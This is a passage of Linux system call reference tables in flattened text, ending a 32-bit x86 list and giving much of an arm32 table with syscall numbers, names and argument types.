clock_gettime 0x109 clockid_t which_clock struct __kernel_timespec *tp - 266 clock_getres 0x10a clockid_t which_clock struct __kernel_timespec *tp - 267 clock_nanosleep 0x10b clockid_t which_clock int flags const struct __kernel_timespec *rqtp 268 statfs64 0x10c const char *path size_t sz struct statfs64 *buf 269 fstatfs64 0x10d unsigned int fd size_t sz struct statfs64 *buf 270 tgkill 0x10e pid_t tgid pid_t pid int sig 271 utimes 0x10f char *filename struct __kernel_old_timeval *utimes - 272 fadvise64_64 0x110 int fd loff_t offset loff_t len 273 vserver 0x111 ? ? ? 274 mbind 0x112 unsigned long start unsigned long len unsigned long mode 275 get_mempolicy 0x113 int *policy unsigned long *nmask unsigned long maxnode 276 set_mempolicy 0x114 int mode const unsigned long *nmask unsigned long maxnode 277 mq_open 0x115 const char *name int oflag umode_t mode 278 mq_unlink 0x116 const char *name - - 279 mq_timedsend 0x117 mqd_t mqdes const char *msg_ptr size_t msg_len 280 mq_timedreceive 0x118 mqd_t mqdes char *msg_ptr size_t msg_len 281 mq_notify 0x119 mqd_t mqdes const struct sigevent *notification - 282 mq_getsetattr 0x11a mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 283 kexec_load 0x11b unsigned long entry unsigned long nr_segments struct kexec_segment *segments 284 waitid 0x11c int which pid_t pid struct siginfo *infop 285 not implemented 0x11d 286 add_key 0x11e const char *_type const char *_description const void *_payload 287 request_key 0x11f const char *_type const char *_description const char *_callout_info 288 keyctl 0x120 int cmd unsigned long arg2 unsigned long arg3 289 ioprio_set 0x121 int which int who int ioprio 290 ioprio_get 0x122 int which int who - 291 inotify_init 0x123 - - - 292 inotify_add_watch 0x124 int fd const char *path u32 mask 293 inotify_rm_watch 0x125 int fd __s32 wd - 294 migrate_pages 0x126 pid_t pid unsigned long maxnode const unsigned long *from 295 openat 0x127 int dfd const char *filename int flags 296 mkdirat 0x128 int dfd const char * pathname umode_t mode 297 mknodat 0x129 int dfd const char * filename umode_t mode 298 fchownat 0x12a int dfd const char *filename uid_t user 299 futimesat 0x12b int dfd const char *filename struct __kernel_old_timeval *utimes 300 fstatat64 0x12c int dfd const char *filename struct stat64 *statbuf 301 unlinkat 0x12d int dfd const char * pathname int flag 302 renameat 0x12e int olddfd const char * oldname int newdfd 303 linkat 0x12f int olddfd const char *oldname int newdfd 304 symlinkat 0x130 const char * oldname int newdfd const char * newname 305 readlinkat 0x131 int dfd const char *path char *buf 306 fchmodat 0x132 int dfd const char * filename umode_t mode 307 faccessat 0x133 int dfd const char *filename int mode 308 pselect6 0x134 int fd_set * fd_set * 309 ppoll 0x135 struct pollfd * unsigned int struct __kernel_timespec * 310 unshare 0x136 unsigned long unshare_flags - - 311 set_robust_list 0x137 struct robust_list_head *head size_t len - 312 get_robust_list 0x138 int pid struct robust_list_head head_ptr size_t *len_ptr 313 splice 0x139 int fd_in loff_t *off_in int fd_out 314 sync_file_range 0x13a int fd loff_t offset loff_t nbytes 315 tee 0x13b int fdin int fdout size_t len 316 vmsplice 0x13c int fd const struct iovec *iov unsigned long nr_segs 317 move_pages 0x13d pid_t pid unsigned long nr_pages const void pages 318 getcpu 0x13e unsigned *cpu unsigned *node struct getcpu_cache *cache 319 epoll_pwait 0x13f int epfd struct epoll_event *events int maxevents 320 utimensat 0x140 int dfd const char *filename struct __kernel_timespec *utimes 321 signalfd 0x141 int ufd sigset_t *user_mask size_t sizemask 322 timerfd_create 0x142 int clockid int flags - 323 eventfd 0x143 unsigned int count - - 324 fallocate 0x144 int fd int mode loff_t offset 325 timerfd_settime 0x145 int ufd int flags const struct __kernel_itimerspec *utmr 326 timerfd_gettime 0x146 int ufd struct __kernel_itimerspec *otmr - 327 signalfd4 0x147 int ufd sigset_t *user_mask size_t sizemask 328 eventfd2 0x148 unsigned int count int flags - 329 epoll_create1 0x149 int flags - - 330 dup3 0x14a unsigned int oldfd unsigned int newfd int flags 331 pipe2 0x14b int *fildes int flags - 332 inotify_init1 0x14c int flags - - 333 preadv 0x14d unsigned long fd const struct iovec *vec unsigned long vlen 334 pwritev 0x14e unsigned long fd const struct iovec *vec unsigned long vlen 335 rt_tgsigqueueinfo 0x14f pid_t tgid pid_t pid int sig 336 perf_event_open 0x150 struct perf_event_attr *attr_uptr pid_t pid int cpu 337 recvmmsg 0x151 int fd struct mmsghdr *msg unsigned int vlen 338 fanotify_init 0x152 unsigned int flags unsigned int event_f_flags - 339 fanotify_mark 0x153 int fanotify_fd unsigned int flags u64 mask 340 prlimit64 0x154 pid_t pid unsigned int resource const struct rlimit64 *new_rlim 341 name_to_handle_at 0x155 int dfd const char *name struct file_handle *handle 342 open_by_handle_at 0x156 int mountdirfd struct file_handle *handle int flags 343 clock_adjtime 0x157 clockid_t which_clock struct __kernel_timex *tx - 344 syncfs 0x158 int fd - - 345 sendmmsg 0x159 int fd struct mmsghdr *msg unsigned int vlen 346 setns 0x15a int fd int nstype - 347 process_vm_readv 0x15b pid_t pid const struct iovec *lvec unsigned long liovcnt 348 process_vm_writev 0x15c pid_t pid const struct iovec *lvec unsigned long liovcnt 349 kcmp 0x15d pid_t pid1 pid_t pid2 int type 350 finit_module 0x15e int fd const char *uargs int flags 351 sched_setattr 0x15f pid_t pid struct sched_attr *attr unsigned int flags 352 sched_getattr 0x160 pid_t pid struct sched_attr *attr unsigned int size 353 renameat2 0x161 int olddfd const char *oldname int newdfd 354 seccomp 0x162 unsigned int op unsigned int flags void *uargs 355 getrandom 0x163 char *buf size_t count unsigned int flags 356 memfd_create 0x164 const char *uname_ptr unsigned int flags - 357 bpf 0x165 int cmd union bpf_attr *attr unsigned int size 358 execveat 0x166 int dfd const char *filename const char *const *argv 359 socket 0x167 int int int 360 socketpair 0x168 int int int 361 bind 0x169 int struct sockaddr * int 362 connect 0x16a int struct sockaddr * int 363 listen 0x16b int int - 364 accept4 0x16c int struct sockaddr * int * 365 getsockopt 0x16d int fd int level int optname 366 setsockopt 0x16e int fd int level int optname 367 getsockname 0x16f int struct sockaddr * int * 368 getpeername 0x170 int struct sockaddr * int * 369 sendto 0x171 int void * size_t 370 sendmsg 0x172 int fd struct user_msghdr *msg unsigned flags 371 recvfrom 0x173 int void * size_t 372 recvmsg 0x174 int fd struct user_msghdr *msg unsigned flags 373 shutdown 0x175 int int - 374 userfaultfd 0x176 int flags - - 375 membarrier 0x177 int cmd unsigned int flags int cpu_id 376 mlock2 0x178 unsigned long start size_t len int flags 377 copy_file_range 0x179 int fd_in loff_t *off_in int fd_out 378 preadv2 0x17a unsigned long fd const struct iovec *vec unsigned long vlen 379 pwritev2 0x17b unsigned long fd const struct iovec *vec unsigned long vlen 380 pkey_mprotect 0x17c unsigned long start size_t len unsigned long prot 381 pkey_alloc 0x17d unsigned long flags unsigned long init_val - 382 pkey_free 0x17e int pkey - - 383 statx 0x17f int dfd const char *path unsigned flags 384 arch_prctl 0x180 ? ? ? 385 not implemented 0x181 386 not implemented 0x182 387 not implemented 0x183 388 not implemented 0x184 389 not implemented 0x185 390 not implemented 0x186 391 not implemented 0x187 392 not implemented 0x188 393 not implemented 0x189 394 not implemented 0x18a 395 not implemented 0x18b 396 not implemented 0x18c 397 not implemented 0x18d 398 not implemented 0x18e 399 not implemented 0x18f 400 not implemented 0x190 401 not implemented 0x191 402 not implemented 0x192 403 clock_gettime64 0x193 ? ? ? 404 clock_settime64 0x194 ? ? ? 405 clock_adjtime64 0x195 ? ? ? 406 clock_getres_time64 0x196 ? ? ? 407 clock_nanosleep_time64 0x197 ? ? ? 408 timer_gettime64 0x198 ? ? ? 409 timer_settime64 0x199 ? ? ? 410 timerfd_gettime64 0x19a ? ? ? 411 timerfd_settime64 0x19b ? ? ? 412 utimensat_time64 0x19c ? ? ? 413 pselect6_time64 0x19d ? ? ? 414 ppoll_time64 0x19e ? ? ? 415 not implemented 0x19f 416 io_pgetevents_time64 0x1a0 ? ? ? 417 recvmmsg_time64 0x1a1 ? ? ? 418 mq_timedsend_time64 0x1a2 ? ? ? 419 mq_timedreceive_time64 0x1a3 ? ? ? 420 semtimedop_time64 0x1a4 ? ? ? 421 rt_sigtimedwait_time64 0x1a5 ? ? ? 422 futex_time64 0x1a6 ? ? ? 423 sched_rr_get_interval_time64 0x1a7 ? ? ? 424 not implemented 0x1a8 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode arm32系统调用表 NR syscall name %r7 arg0 (%r0) arg1 (%r1) arg2 (%r2) 0 restart_syscall 0x00 - - - 1 exit 0x01 int error_code - - 2 fork 0x02 - - - 3 read 0x03 unsigned int fd char *buf size_t count 4 write 0x04 unsigned int fd const char *buf size_t count 5 open 0x05 const char *filename int flags umode_t mode 6 close 0x06 unsigned int fd - - 7 not implemented 0x07 8 creat 0x08 const char *pathname umode_t mode - 9 link 0x09 const char *oldname const char *newname - 10 unlink 0x0a const char *pathname - - 11 execve 0x0b const char *filename const char *const *argv const char *const *envp 12 chdir 0x0c const char *filename - - 13 not implemented 0x0d 14 mknod 0x0e const char *filename umode_t mode unsigned dev 15 chmod 0x0f const char *filename umode_t mode - 16 lchown 0x10 const char *filename uid_t user gid_t group 17 not implemented 0x11 18 not implemented 0x12 19 lseek 0x13 unsigned int fd off_t offset unsigned int whence 20 getpid 0x14 - - - 21 mount 0x15 char *dev_name char *dir_name char *type 22 not implemented 0x16 23 setuid 0x17 uid_t uid - - 24 getuid 0x18 - - - 25 not implemented 0x19 26 ptrace 0x1a long request long pid unsigned long addr 27 not implemented 0x1b 28 not implemented 0x1c 29 pause 0x1d - - - 30 not implemented 0x1e 31 not implemented 0x1f 32 not implemented 0x20 33 access 0x21 const char *filename int mode - 34 nice 0x22 int increment - - 35 not implemented 0x23 36 sync 0x24 - - - 37 kill 0x25 pid_t pid int sig - 38 rename 0x26 const char *oldname const char *newname - 39 mkdir 0x27 const char *pathname umode_t mode - 40 rmdir 0x28 const char *pathname - - 41 dup 0x29 unsigned int fildes - - 42 pipe 0x2a int *fildes - - 43 times 0x2b struct tms *tbuf - - 44 not implemented 0x2c 45 brk 0x2d unsigned long brk - - 46 setgid 0x2e gid_t gid - - 47 getgid 0x2f - - - 48 not implemented 0x30 49 geteuid 0x31 - - - 50 getegid 0x32 - - - 51 acct 0x33 const char *name - - 52 umount2 0x34 ? ? ? 53 not implemented 0x35 54 ioctl 0x36 unsigned int fd unsigned int cmd unsigned long arg 55 fcntl 0x37 unsigned int fd unsigned int cmd unsigned long arg 56 not implemented 0x38 57 setpgid 0x39 pid_t pid pid_t pgid - 58 not implemented 0x3a 59 not implemented 0x3b 60 umask 0x3c int mask - - 61 chroot 0x3d const char *filename - - 62 ustat 0x3e unsigned dev struct ustat *ubuf - 63 dup2 0x3f unsigned int oldfd unsigned int newfd - 64 getppid 0x40 - - - 65 getpgrp 0x41 - - - 66 setsid 0x42 - - - 67 sigaction 0x43 int const struct old_sigaction * struct old_sigaction * 68 not implemented 0x44 69 not implemented 0x45 70 setreuid 0x46 uid_t ruid uid_t euid - 71 setregid 0x47 gid_t rgid gid_t egid - 72 sigsuspend 0x48 int unused1 int unused2 old_sigset_t mask 73 sigpending 0x49 old_sigset_t *uset - - 74 sethostname 0x4a char *name int len - 75 setrlimit 0x4b unsigned int resource struct rlimit *rlim - 76 not implemented 0x4c 77 getrusage 0x4d int who struct rusage *ru - 78 gettimeofday 0x4e struct __kernel_old_timeval *tv struct timezone *tz - 79 settimeofday 0x4f struct __kernel_old_timeval *tv struct timezone *tz - 80 getgroups 0x50 int gidsetsize gid_t *grouplist - 81 setgroups 0x51 int gidsetsize gid_t *grouplist - 82 not implemented 0x52 83 symlink 0x53 const char *old const char *new - 84 not implemented 0x54 85 readlink 0x55 const char *path char *buf int bufsiz 86 uselib 0x56 const char *library - - 87 swapon 0x57 const char *specialfile int swap_flags - 88 reboot 0x58 int magic1 int magic2 unsigned int cmd 89 not implemented 0x59 90 not implemented 0x5a 91 munmap 0x5b unsigned long addr size_t len - 92 truncate 0x5c const char *path long length - 93 ftruncate 0x5d unsigned int fd unsigned long length - 94 fchmod 0x5e unsigned int fd umode_t mode - 95 fchown 0x5f unsigned int fd uid_t user gid_t group 96 getpriority 0x60 int which int who - 97 setpriority 0x61 int which int who int niceval 98 not implemented 0x62 99 statfs 0x63 const char * path struct statfs *buf - 100 fstatfs 0x64 unsigned int fd struct statfs *buf - 101 not implemented 0x65 102 not implemented 0x66 103 syslog 0x67 int type char *buf int len 104 setitimer 0x68 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 105 getitimer 0x69 int which struct __kernel_old_itimerval *value - 106 stat 0x6a const char *filename struct __old_kernel_stat *statbuf - 107 lstat 0x6b const char *filename struct __old_kernel_stat *statbuf - 108 fstat 0x6c unsigned int fd struct __old_kernel_stat *statbuf - 109 not implemented 0x6d 110 not implemented 0x6e 111 vhangup 0x6f - - - 112 not implemented 0x70 113 not implemented 0x71 114 wait4 0x72 pid_t pid int *stat_addr int options 115 swapoff 0x73 const char *specialfile - - 116 sysinfo 0x74 struct sysinfo *info - - 117 not implemented 0x75 118 fsync 0x76 unsigned int fd - - 119 sigreturn 0x77 ? ? ? 120 clone 0x78 unsigned long unsigned long int * 121 setdomainname 0x79 char *name int len - 122 uname 0x7a struct old_utsname * - - 123 not implemented 0x7b 124 adjtimex 0x7c struct __kernel_timex *txc_p - - 125 mprotect 0x7d unsigned long start size_t len unsigned long prot 126 sigprocmask 0x7e int how old_sigset_t *set old_sigset_t *oset 127 not implemented 0x7f 128 init_module 0x80 void *umod unsigned long len const char *uargs 129 delete_module 0x81 const char *name_user unsigned int flags - 130 not implemented 0x82 131 quotactl 0x83 unsigned int cmd const char *special qid_t id 132 getpgid 0x84 pid_t pid - - 133 fchdir 0x85 unsigned int fd - - 134 bdflush 0x86 ? ? ? 135 sysfs 0x87 int option unsigned long arg1 unsigned long arg2 136 personality 0x88 unsigned int personality - - 137 not implemented 0x89 138 setfsuid 0x8a uid_t uid - - 139 setfsgid 0x8b gid_t gid - - 140 _llseek 0x8c ? ? ? 141 getdents 0x8d unsigned int fd struct linux_dirent *dirent unsigned int count 142 _newselect 0x8e ? ? ? 143 flock 0x8f unsigned int fd unsigned int cmd - 144 msync 0x90 unsigned long start size_t len int flags 145 readv 0x91 unsigned long fd const struct iovec *vec unsigned long vlen 146 writev 0x92 unsigned long fd const struct iovec *vec unsigned long vlen 147 getsid 0x93 pid_t pid - - 148 fdatasync 0x94 unsigned int fd - - 149 _sysctl 0x95 ? ? ? 150 mlock 0x96 unsigned long start size_t len - 151 munlock 0x97 unsigned long start size_t len - 152 mlockall 0x98 int flags - - 153 munlockall 0x99 - - - 154 sched_setparam 0x9a pid_t pid struct sched_param *param - 155 sched_getparam 0x9b pid_t pid struct sched_param *param - 156 sched_setscheduler 0x9c pid_t pid int policy struct sched_param *param 157 sched_getscheduler 0x9d pid_t pid - - 158 sched_yield 0x9e - - - 159 sched_get_priority_max 0x9f int policy - - 160 sched_get_priority_min 0xa0 int policy - - 161 sched_rr_get_interval 0xa1 pid_t pid struct __kernel_timespec *interval - 162 nanosleep 0xa2 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 163 mremap 0xa3 unsigned long addr unsigned long old_len unsigned long new_len 164 setresuid 0xa4 uid_t ruid uid_t euid uid_t suid 165 getresuid 0xa5 uid_t *ruid uid_t *euid uid_t *suid 166 not implemented 0xa6 167 not implemented 0xa7 168 poll 0xa8 struct pollfd *ufds unsigned int nfds int timeout 169 nfsservctl 0xa9 ? ? ? 170 setresgid 0xaa gid_t rgid gid_t egid gid_t sgid 171 getresgid 0xab gid_t *rgid gid_t *egid gid_t *sgid 172 prctl 0xac int option unsigned long arg2 unsigned long arg3 173 rt_sigreturn 0xad ? ? ? 174 rt_sigaction 0xae int const struct sigaction * struct sigaction * 175 rt_sigprocmask 0xaf int how sigset_t *set sigset_t *oset 176 rt_sigpending 0xb0 sigset_t *set size_t sigsetsize - 177 rt_sigtimedwait 0xb1 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 178 rt_sigqueueinfo 0xb2 pid_t pid int sig siginfo_t *uinfo 179 rt_sigsuspend 0xb3 sigset_t *unewset size_t sigsetsize - 180 pread64 0xb4 unsigned int fd char *buf size_t count 181 pwrite64 0xb5 unsigned int fd const char *buf size_t count 182 chown 0xb6 const char *filename uid_t user gid_t group 183 getcwd 0xb7 char *buf unsigned long size - 184 capget 0xb8 cap_user_header_t header cap_user_data_t dataptr - 185 capset 0xb9 cap_user_header_t header const cap_user_data_t data - 186 sigaltstack 0xba const struct sigaltstack *uss struct sigaltstack *uoss - 187 sendfile 0xbb int out_fd int in_fd off_t *offset 188 not implemented 0xbc 189 not implemented 0xbd 190 vfork 0xbe - - - 191 ugetrlimit 0xbf ? ? ? 192 mmap2 0xc0 ? ? ? 193 truncate64 0xc1 const char *path loff_t length - 194 ftruncate64 0xc2 unsigned int fd loff_t length - 195 stat64 0xc3 const char *filename struct stat64 *statbuf - 196 lstat64 0xc4 const char *filename struct stat64 *statbuf - 197 fstat64 0xc5 unsigned long fd struct stat64 *statbuf - 198 lchown32 0xc6 ? ? ? 199 getuid32 0xc7 ? ? ? 200 getgid32 0xc8 ? ? ? 201 geteuid32 0xc9 ? ? ? 202 getegid32 0xca ? ? ? 203 setreuid32 0xcb ? ? ? 204 setregid32 0xcc ? ? ? 205 getgroups32 0xcd ? ? ? 206 setgroups32 0xce ? ? ? 207 fchown32 0xcf ? ? ? 208 setresuid32 0xd0 ? ? ? 209 getresuid32 0xd1 ? ? ? 210 setresgid32 0xd2 ? ? ? 211 getresgid32 0xd3 ? ? ? 212 chown32 0xd4 ? ? ? 213 setuid32 0xd5 ? ? ? 214 setgid32 0xd6 ? ? ? 215 setfsuid32 0xd7 ? ? ? 216 setfsgid32 0xd8 ? ? ? 217 getdents64 0xd9 unsigned int fd struct linux_dirent64 *dirent unsigned int count 218 pivot_root 0xda const char *new_root const char *put_old - 219 mincore 0xdb unsigned long start size_t len unsigned char * vec 220 madvise 0xdc unsigned long start size_t len int behavior 221 fcntl64 0xdd unsigned int fd unsigned int cmd unsigned long arg 222 not implemented 0xde 223 not implemented 0xdf 224 gettid 0xe0 - - - 225 readahead 0xe1 int fd loff_t offset size_t count 226 setxattr 0xe2 const char *path const char *name const void *value 227 lsetxattr 0xe3 const char *path const char *name const void *value 228 fsetxattr 0xe4 int fd const char *name const void *value 229 getxattr 0xe5 const char *path const char *name void *value 230 lgetxattr 0xe6 const char *path const char *name void *value 231 fgetxattr 0xe7 int fd const char *name void *value 232 listxattr 0xe8 const char *path char *list size_t size 233 llistxattr 0xe9 const char *path char *list size_t size 234 flistxattr 0xea int fd char *list size_t size 235 removexattr 0xeb const char *path const char *name - 236 lremovexattr 0xec const char *path const char *name - 237 fremovexattr 0xed int fd const char *name - 238 tkill 0xee pid_t pid int sig - 239 sendfile64 0xef int out_fd int in_fd loff_t *offset 240 futex 0xf0 u32 *uaddr int op u32 val 241 sched_setaffinity 0xf1 pid_t pid unsigned int len unsigned long *user_mask_ptr 242 sched_getaffinity 0xf2 pid_t pid unsigned int len unsigned long *user_mask_ptr 243 io_setup 0xf3 unsigned nr_reqs aio_context_t *ctx - 244 io_destroy 0xf4 aio_context_t ctx - - 245 io_getevents 0xf5 aio_context_t ctx_id long min_nr long nr 246 io_submit 0xf6 aio_context_t long struct iocb 247 io_cancel 0xf7 aio_context_t ctx_id struct iocb *iocb struct io_event *result 248 exit_group 0xf8 int error_code - - 249 lookup_dcookie 0xf9 u64 cookie64 char *buf size_t len 250 epoll_create 0xfa int size - - 251 epoll_ctl 0xfb int epfd int op int fd 252 epoll_wait 0xfc int epfd struct epoll_event *events int maxevents 253 remap_file_pages 0xfd unsigned long start unsigned long size unsigned long prot 254 not implemented 0xfe 255 not implemented 0xff 256 set_tid_address 0x100 int *tidptr - - 257 timer_create 0x101 clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 258 timer_settime 0x102 timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 259 timer_gettime 0x103 timer_t timer_id struct __kernel_itimerspec *setting - 260 timer_getoverrun 0x104 timer_t timer_id - - 261 timer_delete 0x105 timer_t timer_id - - 262 clock_settime 0x106 clockid_t which_clock const struct __kernel_timespec *tp - 263 clock_gettime 0x107 clockid_t which_clock struct __kernel_timespec *tp - 264 clock_getres 0x108 clockid_t which_clock struct __kernel_timespec *tp - 265 clock_nanosleep 0x109 clockid_t which_clock int flags const struct __kernel_timespec *rqtp 266 statfs64 0x10a const char *path size_t sz struct statfs64 *buf 267 fstatfs64 0x10b unsigned int fd size_t sz struct statfs64 *buf 268 tgkill 0x10c pid_t tgid pid_t pid int sig 269 utimes 0x10d char *filename struct __kernel_old_timeval *utimes - 270 arm_fadvise64_64 0x10e ? ? ? 271 pciconfig_iobase 0x10f long which unsigned long bus unsigned long devfn 272 pciconfig_read 0x110 unsigned long bus unsigned long dfn unsigned long off 273 pciconfig_write 0x111 unsigned long bus unsigned long dfn unsigned long off 274 mq_open 0x112 const char *name int oflag umode_t mode 275 mq_unlink 0x113 const char *name - - 276 mq_timedsend 0x114 mqd_t mqdes const char *msg_ptr size_t msg_len 277 mq_timedreceive 0x115 mqd_t mqdes char *msg_ptr size_t msg_len 278 mq_notify 0x116 mqd_t mqdes const struct sigevent *notification - 279 mq_getsetattr 0x117 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 280 waitid 0x118 int which pid_t pid struct siginfo *infop 281 socket 0x119 int int int 282 bind 0x11a int struct sockaddr * int 283 connect 0x11b int struct sockaddr * int 284 listen 0x11c int int - 285 accept 0x11d int struct sockaddr * int * 286 getsockname 0x11e int struct sockaddr * int * 287 getpeername 0x11f int struct sockaddr * int * 288 socketpair 0x120 int int int 289 send 0x121 int void * size_t 290 sendto 0x122 int void * size_t 291 recv 0x123 int void * size_t 292 recvfrom 0x124 int void * size_t 293 shutdown 0x125 int int - 294 setsockopt 0x126 int fd int level int optname 295 getsockopt 0x127 int fd int level int optname 296 sendmsg 0x128 int fd struct user_msghdr *msg unsigned flags 297 recvmsg 0x129 int fd struct user_msghdr *msg unsigned flags 298 semop 0x12a int semid struct sembuf *sops unsigned nsops 299 semget 0x12b key_t key int nsems int semflg 300 semctl 0x12c int semid int semnum int cmd 301 msgsnd 0x12d int msqid struct msgbuf *msgp size_t msgsz 302 msgrcv 0x12e int msqid struct msgbuf *msgp size_t msgsz 303 msgget 0x12f key_t key int msgflg - 304 msgctl 0x130 int msqid int cmd struct msqid_ds *buf 305 shmat 0x131 int shmid char *shmaddr int shmflg 306 shmdt 0x132 char *shmaddr - - 307 shmget 0x133 key_t key size_t size int flag 308 shmctl 0x134 int shmid int cmd struct shmid_ds *buf 309 add_key 0x135 const char *_type const char *_description const void *_payload 310 request_key 0x136 const char *_type const char *_description const char *_callout_info 311 keyctl 0x137 int cmd unsigned long arg2 unsigned long arg3 312 semtimedop 0x138 int semid struct sembuf *sops unsigned nsops 313 vserver 0x139 ? ? ? 314 ioprio_set 0x13a int which int who int ioprio 315 ioprio_get 0x13b int which int who - 316 inotify_init 0x13c - - - 317 inotify_add_watch 0x13d int fd const char *path u32 mask 318 inotify_rm_watch 0x13e int fd __s32 wd - 319 mbind 0x13f unsigned long start unsigned long len unsigned long mode 320 get_mempolicy 0x140 int *policy unsigned long *nmask unsigned long maxnode 321 set_mempolicy 0x141 int mode const unsigned long *nmask unsigned long maxnode 322 openat 0x142 int dfd const char *filename int flags 323 mkdirat 0x143 int dfd const char * pathname umode_t mode 324 mknodat 0x144 int dfd const char * filename umode_t mode 325 fchownat 0x145 int dfd const char *filename uid_t user 326 futimesat 0x146 int dfd const char *filename struct __kernel_old_timeval *utimes 327 fstatat64 0x147 int dfd const char *filename struct stat64 *statbuf 328 unlinkat 0x148 int dfd const char * pathname int flag 329 renameat 0x149 int olddfd const char * oldname int newdfd 330 linkat 0x14a int olddfd const char *oldname int newdfd 331 symlinkat 0x14b const char * oldname int newdfd const char * newname 332 readlinkat 0x14c int dfd const char *path char *buf 333 fchmodat 0x14d int dfd const char * filename umode_t mode 334 faccessat 0x14e int dfd const char *filename int mode 335 pselect6 0x14f int fd_set * fd_set * 336 ppoll 0x150 struct pollfd * unsigned int struct __kernel_timespec * 337 unshare 0x151 unsigned long unshare_flags - - 338 set_robust_list 0x152 struct robust_list_head *head size_t len - 339 get_robust_list 0x153 int pid struct robust_list_head head_ptr size_t *len_ptr 340 splice 0x154 int fd_in loff_t *off_in int fd_out 341 arm_sync_file_range 0x155 ? ? ? 341 sync_file_range2 0x155 int fd unsigned int flags loff_t offset 342 tee 0x156 int fdin int fdout size_t len 343 vmsplice 0x157 int fd const struct iovec *iov unsigned long nr_segs 344 move_pages 0x158 pid_t pid unsigned long nr_pages const void pages 345 getcpu 0x159 unsigned *cpu unsigned *node struct getcpu_cache *cache 346 epoll_pwait 0x15a int epfd struct epoll_event *events int maxevents 347 kexec_load 0x15b unsigned long entry unsigned long nr_segments struct kexec_segment *segments 348 utimensat 0x15c int dfd const char *filename struct __kernel_timespec *utimes 349 signalfd 0x15d int ufd sigset_t *user_mask size_t sizemask 350 timerfd_create 0x15e int clockid int flags - 351 eventfd 0x15f unsigned int count - - 352 fallocate 0x160 int fd int mode loff_t offset 353 timerfd_settime 0x161 int ufd int flags const struct __kernel_itimerspec *utmr 354 timerfd_gettime 0x162 int ufd struct __kernel_itimerspec *otmr - 355 signalfd4 0x163 int ufd sigset_t *user_mask size_t sizemask 356 eventfd2 0x164 unsigned int count int flags - 357 epoll_create1 0x165 int flags - - 358 dup3 0x166 unsigned int oldfd unsigned int newfd int flags 359 pipe2 0x167 int *fildes int flags - 360 inotify_init1 0x168 int flags - - 361 preadv 0x169 unsigned long fd const struct iovec *vec unsigned long vlen 362 pwritev 0x16a unsigned long fd const struct iovec *vec unsigned long vlen 363 rt_tgsigqueueinfo 0x16b pid_t tgid pid_t pid int sig 364 perf_event_open 0x16c struct perf_event_attr *attr_uptr pid_t pid int cpu 365 recvmmsg 0x16d int fd struct mmsghdr *msg unsigned int vlen 366 accept4 0x16e int struct sockaddr * int * 367 fanotify_init 0x16f unsigned int flags unsigned int event_f_flags - 368 fanotify_mark 0x170 int fanotify_fd unsigned int flags u64 mask 369 prlimit64 0x171 pid_t pid unsigned int resource const struct rlimit64 *new_rlim 370 name_to_handle_at 0x172 int dfd const char *name struct file_handle *handle 371 open_by_handle_at 0x173 int mountdirfd struct file_handle *handle int flags 372 clock_adjtime 0x174 clockid_t which_clock struct __kernel_timex *tx - 373 syncfs 0x175 int fd - - 374 sendmmsg 0x176 int fd struct mmsghdr *msg unsigned int vlen 375 setns 0x177 int fd int nstype - 376 process_vm_readv 0x178 pid_t pid const struct iovec *lvec unsigned long liovcnt 377 process_vm_writev 0x179 pid_t pid const struct iovec *lvec unsigned long liovcnt 378 kcmp 0x17a pid_t pid1 pid_t pid2 int type 379 finit_module 0x17b int fd const char *uargs int flags 380 sched_setattr 0x17c pid_t pid struct sched_attr *attr unsigned int flags 381 sched_getattr 0x17d pid_t pid struct sched_attr *attr unsigned int size 382 renameat2 0x17e int olddfd const char *oldname int newdfd 383 seccomp 0x17f unsigned int op unsigned int flags void *uargs 384 getrandom 0x180 char *buf size_t count unsigned int flags 385 memfd_create 0x181 const char *uname_ptr unsigned int flags - 386 bpf 0x182 int cmd union bpf_attr *attr unsigned int size 387 execveat 0x183 int dfd const char *filename const char *const *argv 388 userfaultfd 0x184 int flags - - 389 membarrier 0x185 int cmd unsigned int flags int cpu_id 390 mlock2 0x186 unsigned long start size_t len int flags 391 copy_file_range 0x187 int fd_in loff_t *off_in int fd_out 392 preadv2 0x188 unsigned long fd const struct iovec *vec unsigned long vlen 393 pwritev2 0x189 unsigned long fd const struct iovec *vec unsigned long vlen 394 pkey_mprotect 0x18a unsigned long start size_t len unsigned long prot 395 pkey_alloc 0x18b unsigned long flags unsigned long init_val - 396 pkey_free 0x18c int pkey - - 397 statx 0x18d int dfd const char *path unsigned flags 398 not implemented 0x18e 399 not implemented 0x18f 400 not implemented 0x190 401 not implemented 0x191 402 not implemented 0x192 403 clock_gettime64 0x193 ? ? ? 404 clock_settime64 0x194 ? ? ? 405 clock_adjtime64 0x195 ? ? ? 406 clock_getres_time64 0x196 ? ? ? 407 clock_nanosleep_time64 0x197 ? ? ? 408 timer_gettime64 0x198 ? ? ? 409 timer_settime64 0x199 ? ? ? 410 timerfd_gettime64 0x19a ? ? ? 411 timerfd_settime64 0x19b ? ? ? 412 utimensat_time64 0x19c ? ? ? 413 pselect6_time64 0x19d ? ? ? 414 ppoll_time64 0x19e ? ? ? 415 not implemented 0x19f 416 io_pgetevents_time64 0x1a0 ? ? ? 417 recvmmsg_time64 0x1a1 ? ? ? 418 mq_timedsend_time64 0x1a2 ? ? ? 419 mq_timedreceive_time64 0x1a3 ? ? ? 420 semtimedop_time64 0x1a4 ? ? ? 421 rt_sigtimedwait_time64 0x1a5 ? ? ? 422 futex_time64 0x1a6 ? ? ? 423 sched_rr_get_interval_time64 0x1a7 ? ? ? 424 not implemented 0x1a8 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not 